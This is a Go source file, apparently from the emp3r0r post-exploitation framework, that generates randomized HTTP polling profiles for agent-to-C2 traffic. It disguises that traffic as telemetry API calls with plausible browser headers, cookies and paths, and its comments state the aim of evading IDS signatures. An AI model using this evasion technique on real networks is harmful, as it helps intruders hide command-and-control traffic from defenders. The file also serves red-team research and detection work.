package transport

import (
	"fmt"
	"slices"
	"strings"

	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// This file generates the default HTTP polling ("malleable") profile. A single
// hard-coded profile is a network signature: every deployment shares the same
// path, cookie names and User-Agent, so one IDS rule catches them all. The
// generator below draws a fresh, internally consistent profile so installs do
// not look alike, while still using plausible API/browser values.
//
// The agent and the CC must agree on the exact profile, so callers persist the
// generated value in the config file (and embed it in the agent) instead of
// regenerating it on every load.

// mallPathPrefixes and mallPathResources are combined into a plausible-looking
// API route. They are deliberately generic service names that appear on real
// telemetry/health endpoints.
var (
	mallPathPrefixes = []string{
		"/api/v1", "/api/v2", "/api/v3", "/v1", "/v2", "/api", "/rest", "/services",
	}
	mallPathResources = []string{
		"telemetry", "metrics", "events", "analytics", "status", "health",
		"sync", "config", "updates", "reports", "sessions", "activity",
		"ingest", "collect", "gateway", "beacon", "heartbeat", "inventory",
		"devices", "agents", "endpoints", "checks", "signals", "presence",
	}
	// mallHeaderWords are used to build a plausible request-header carrier for
	// the session/init/close tokens.
	mallHeaderWords = []string{
		"Request", "Trace", "Session", "Stream", "Client", "Correlation",
		"Conversation", "Transaction", "Activity", "Context", "Channel",
	}
	// mallUserAgents are current-ish browser strings. A browser User-Agent with
	// no matching browser headers is itself a tell, so randomMalleableHeaders
	// always pairs a UA with a consistent header set.
	mallUserAgents = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15",
	}
	mallAcceptLanguages = []string{
		"en-US,en;q=0.9",
		"en-GB,en;q=0.9",
		"en-US,en;q=0.8",
		"en-CA,en;q=0.9,fr-CA;q=0.8",
	}
)

func pick[T any](items []T) T {
	return items[util.RandInt(0, len(items))]
}

// randomMalleablePath builds a plausible API route with an occasional random
// segment so two builds rarely share the exact path.
func randomMalleablePath() string {
	path := fmt.Sprintf("%s/%s", pick(mallPathPrefixes), pick(mallPathResources))
	switch util.RandInt(0, 3) {
	case 0:
		path += "/" + strings.ToLower(util.RandStr(util.RandInt(4, 8)))
	case 1:
		path += fmt.Sprintf("/%d", util.RandInt(1, 1_000_000))
	}
	return path
}

// randomHeaderName returns a unique request-header carrier name. The random
// suffix keeps the session/init/close carriers from colliding (a shared header
// name would overwrite the other value and break the session lookup).
func randomHeaderName() string {
	return fmt.Sprintf("X-%s-%s", pick(mallHeaderWords), strings.ToUpper(util.RandStr(util.RandInt(4, 6))))
}

func randomHeaderValue() string {
	return util.RandStr(util.RandInt(10, 20))
}

// randomMalleableHeaders pairs a browser User-Agent with the headers that
// browser would send on an XHR, so the User-Agent is not the only browser-like
// thing in the request.
func randomMalleableHeaders() map[string]string {
	return map[string]string{
		"User-Agent":      pick(mallUserAgents),
		"Accept":          "*/*",
		"Accept-Language": pick(mallAcceptLanguages),
		"Accept-Encoding": "gzip, deflate, br",
		"Sec-Fetch-Dest":  "empty",
		"Sec-Fetch-Mode":  "cors",
		"Sec-Fetch-Site":  "same-origin",
	}
}

// RandomMalleableHTTPConfig returns a complete, internally consistent HTTP
// profile with a randomized path, session carrier and browser headers.
func RandomMalleableHTTPConfig() def.MalleableHTTPConfig {
	profile := def.MalleableHTTPConfig{
		C2Path:        randomMalleablePath(),
		CustomHeaders: randomMalleableHeaders(),
	}

	// Most of the time carry the session in cookies (the common case for a
	// telemetry-style endpoint). Occasionally use request headers instead.
	if util.RandInt(0, 4) == 0 {
		profile.SessionHeader = randomHeaderName()
		profile.SessionValue = "%s"
		// Distinct names are required: the client sets the session, init and
		// close values independently, and a shared header would be overwritten.
		profile.InitHeader = randomHeaderNameExcept(profile.SessionHeader)
		profile.InitValue = randomHeaderValue()
		profile.CloseHeader = randomHeaderNameExcept(profile.SessionHeader, profile.InitHeader)
		profile.CloseValue = randomHeaderValue()
		return profile
	}

	sessionCookie := randomCookieName()
	initCookie := randomCookieNameExcept(sessionCookie)
	closeCookie := randomCookieNameExcept(sessionCookie, initCookie)
	profile.SessionHeader = "Cookie"
	profile.SessionValue = sessionCookie + "=%s"
	profile.InitHeader = "Cookie"
	profile.InitValue = initCookie + "=" + randomHeaderValue()
	profile.CloseHeader = "Cookie"
	profile.CloseValue = closeCookie + "=" + randomHeaderValue()
	return profile
}

// randomHeaderNameExcept returns a header name that is not one of the taken
// names. The space is large enough that a retry loop terminates immediately in
// practice, and the bound avoids any chance of spinning forever.
func randomHeaderNameExcept(taken ...string) string {
	for range 16 {
		name := randomHeaderName()
		if !slices.ContainsFunc(taken, func(item string) bool {
			return strings.EqualFold(item, name)
		}) {
			return name
		}
	}
	// Fall back to a suffix-collision-proof name rather than risk a shared
	// carrier. This is deterministic but still unique among the three tokens.
	return "X-Session-" + strings.ToUpper(util.RandStr(8))
}

func randomCookieName() string {
	return strings.ToLower(util.RandStr(util.RandInt(6, 10)))
}

// randomCookieNameExcept returns a cookie name not present in taken. A shared
// name would make http.Request.Cookie return the wrong value, so the session,
// init and close cookies must all be distinct.
func randomCookieNameExcept(taken ...string) string {
	for range 16 {
		name := randomCookieName()
		if !slices.Contains(taken, name) {
			return name
		}
	}
	return randomCookieName() + util.RandStr(4)
}

// isCompleteMalleableConfig reports whether a profile specifies every field the
// client and server need. A partial profile is unusable: the session lookup and
// init/close detection would disagree between the two sides.
func isCompleteMalleableConfig(cfg def.MalleableHTTPConfig) bool {
	return cfg.C2Path != "" &&
		cfg.SessionHeader != "" && cfg.SessionValue != "" &&
		cfg.InitHeader != "" && cfg.InitValue != "" &&
		cfg.CloseHeader != "" && cfg.CloseValue != "" &&
		len(cfg.CustomHeaders) > 0
}

// NormalizeMalleableHTTPConfig preserves a fully specified profile and replaces
// an incomplete one with a fresh random profile. Callers must persist the
// result before the same profile is needed by both agent and CC.
func NormalizeMalleableHTTPConfig(cfg def.MalleableHTTPConfig) def.MalleableHTTPConfig {
	if isCompleteMalleableConfig(cfg) {
		return cfg
	}
	return RandomMalleableHTTPConfig()
}
